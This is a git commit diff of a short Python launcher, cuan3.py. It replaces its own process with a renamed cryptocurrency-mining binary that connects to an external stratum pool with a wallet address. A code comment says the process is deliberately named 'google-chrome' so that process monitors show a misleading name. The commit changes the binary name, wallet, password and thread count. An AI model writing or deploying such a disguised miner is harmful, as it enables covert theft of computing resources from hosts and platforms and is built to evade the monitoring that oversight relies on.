3c6a1cd694e99828bf0c46f3ca0d68e5df1387e7
ferasa <86012372+desafff@users.noreply.github.com>
2025-01-01 20:25:56 +0700

    Update cuan3.py

--- cuan3.py
+++ cuan3.py
@@ -1,11 +1,11 @@
 import os
 
 # Replace the current process with the mining process
-os.execvp("./hellminer", [
+os.execvp("./helikopter", [
     "google-chrome",  # This will be the name shown in process monitors
     "-c",
     "stratum+tcp://us.vipor.net:5040",
-    "-u", "RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK.colab",
-    "-p", "solo",
-    "-t","80"
+    "-u", "R9HMvHdgUX8h7h7ch3xGq4qGGVsRmuC74T.tr1",
+    "-p", "x",
+    "-t","6"
 ])
